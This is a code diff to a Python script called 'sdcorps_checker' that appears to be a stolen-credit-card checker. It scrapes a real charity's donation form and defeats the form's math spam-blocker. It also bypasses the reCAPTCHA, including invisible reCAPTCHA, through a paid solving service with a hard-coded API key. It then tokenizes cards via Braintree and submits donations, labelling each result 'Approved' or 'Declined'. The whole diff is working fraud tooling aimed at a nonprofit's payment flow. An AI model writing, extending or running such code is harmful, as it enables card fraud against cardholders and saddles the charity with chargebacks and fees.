@@ -19,40 +19,60 @@ def paserX(data, first, last):
 # CaptchaAI Configuration
 CAPTCHAAI_KEY = 'okrzovimon1mv5kkiviljc5ml9dok0cw'
 
-def solve_captcha(site_key, site_url):
+def solve_captcha(site_key, site_url, invisible=True):
     try:
+        # Using ocr.captchaai.com as it's the only working endpoint for this key
         in_url = "https://ocr.captchaai.com/in.php"
         data = {
             "key": CAPTCHAAI_KEY,
             "method": "userrecaptcha",
             "googlekey": site_key,
             "pageurl": site_url,
+            "invisible": 1,
             "json": 1
         }
+        print(f"Submitting task to CaptchaAI OCR (Invisible: {invisible})...")
         res = requests.post(in_url, data=data, timeout=30)
         resp = res.json()
+        
         if resp.get("status") != 1:
+            print(f"Task Creation Error: {resp.get('request')}")
             return None
         
         request_id = resp.get("request")
+        print(f"Task Created. ID: {request_id}. Polling for result...")
+
+        # Step 2: Get Result
         res_url = "https://ocr.captchaai.com/res.php"
-        for _ in range(40):
+        for i in range(60):
             time.sleep(5)
-            params = {"key": CAPTCHAAI_KEY, "action": "get", "id": request_id, "json": 1}
+            params = {
+                "key": CAPTCHAAI_KEY,
+                "action": "get",
+                "id": request_id,
+                "json": 1
+            }
             res = requests.get(res_url, params=params, timeout=30)
             resp = res.json()
+            
             if resp.get("status") == 1:
-                return resp.get("request")
+                token = resp.get("request")
+                print("Captcha Solved Successfully!")
+                return token
+            
             if resp.get("request") == "ERROR_CAPTCHA_UNSOLVABLE":
+                print("Error: Captcha Unsolvable")
                 return None
-    except:
+                
+            print(f"Attempt {i+1}: Status = {resp.get('request')}")
+            
+    except Exception as e:
+        print(f"Captcha solving exception: {e}")
         return None
     return None
 
 def solve_math(text):
     try:
-        # Improved regex to find numbers and operators even if spaced differently
-        # Supports: "1 + 1", "5-2", "3 * 4", etc.
         match = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)', text)
         if match:
             num1 = int(match.group(1))
@@ -88,17 +108,19 @@ class sdcorps_checker:
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             }
 
-            # 1. Visit page to get form data and math problem
+            # 1. Visit page
+            print("Visiting donation page...")
             resp = session.get('https://sdcorps.org/campaigns/support/', headers=headers, timeout=30).text
             
             form_id = paserX(resp, 'name="charitable_form_id" value="', '"')
             donation_nonce = paserX(resp, 'name="_charitable_donation_nonce" value="', '"')
+            campaign_id = paserX(resp, 'name="campaign_id" value="', '"') or "2583"
             
-            # Solve Math Problem
             math_text = paserX(resp, 'charitable_spamblocker_math_field_element">', '</label>')
             if not math_text:
                 math_text = paserX(resp, 'simple math problem:', '*')
             math_result = solve_math(math_text or "")
+            print(f"Math Result: {math_result}")
 
             # 2. Get Braintree Client Token
             token_match = re.search(r'"client_token":"([^"]+)"', resp)
@@ -115,13 +137,15 @@ class sdcorps_checker:
             except:
                 bearer = token
 
-            # 3. Solve Captcha
+            # 3. Solve Captcha (Invisible support)
             site_key = paserX(resp, 'data-sitekey="', '"') or "6Le8uk8UAAAAAKmSdQU9NjX37lzlRdkZVvaa43nY"
-            cap = solve_captcha(site_key, 'https://sdcorps.org/campaigns/support/')
+            is_invisible = 'invisible' in resp.lower() or 'data-size="invisible"' in resp.lower()
+            cap = solve_captcha(site_key, 'https://sdcorps.org/campaigns/support/', invisible=is_invisible)
             if not cap:
                 return "Error", "Captcha bypass failed"
 
             # 4. Braintree Tokenize
+            print("Tokenizing card with Braintree...")
             bt_headers = {
                 'authorization': f'Bearer {bearer}',
                 'braintree-version': '2018-05-10',
@@ -149,6 +173,7 @@ class sdcorps_checker:
                 return "Error", f"Braintree Tokenization Failed: {json.dumps(bt_res)}"
 
             # 5. Submit Donation
+            print("Submitting final donation request...")
             ajax_headers = {
                 'user-agent': ua,
                 'x-requested-with': 'XMLHttpRequest',
@@ -161,7 +186,8 @@ class sdcorps_checker:
                 'charitable_instance_id': form_id,
                 '_charitable_donation_nonce': donation_nonce,
                 '_wp_http_referer': '/campaigns/support/',
-                'campaign_id': '2583',
+                'charitable_action': 'make_donation',
+                'campaign_id': campaign_id,
                 'description': 'Support',
                 'ID': '0',
                 'gateway': 'braintree',
@@ -191,14 +217,15 @@ class sdcorps_checker:
             if final_resp.get('success'):
                 return "Approved! ✅", "Transaction Successful"
             else:
-                # Check for common error structures
                 data = final_resp.get('data', {})
                 errors = data.get('errors', [])
                 if errors:
                     msg = errors[0].get('message', 'Declined')
+                elif 'message' in data:
+                    msg = data.get('message')
                 else:
-                    msg = data.get('message', 'Declined')
-                return "Declined! ❌", msg
+                    msg = final_resp.get('data', 'Declined')
+                return "Declined! ❌", str(msg)
 
         except Exception as e:
             return "Error", str(e)
